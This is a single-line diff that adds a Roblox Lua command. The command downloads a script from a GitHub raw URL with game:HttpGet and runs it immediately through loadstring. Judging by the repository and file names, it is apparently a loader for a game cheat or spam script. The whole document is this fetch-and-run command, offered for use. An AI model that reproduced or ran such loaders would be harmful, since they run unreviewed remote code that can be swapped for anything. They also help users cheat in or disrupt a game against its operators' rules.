@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/partsoapmakerremain/loaders/main/loaders/ch2-chop-a-forest-spam7-yz41jz57jfmaex.lua"))()
